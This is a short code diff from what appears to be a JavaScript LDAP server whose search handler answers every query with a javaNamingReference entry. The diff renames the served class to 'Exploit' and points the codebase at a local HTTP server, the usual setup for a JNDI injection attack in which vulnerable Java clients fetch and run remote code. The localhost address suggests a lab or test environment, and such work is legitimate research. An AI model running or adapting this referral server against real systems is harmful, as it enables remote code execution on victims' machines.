@@ -8,8 +8,8 @@ server.search('', (request, response) => {
         dn: request.dn.toString(),
         attributes: {
             objectClass: ['javaNamingReference'],
-            javaClassName: ['Main'],
-            javaFactory: ['Main'],
+            javaClassName: ['Exploit'],
+            javaFactory: ['Exploit'],
             javaCodebase: ['http://127.0.0.1:3002/']
         }
     })
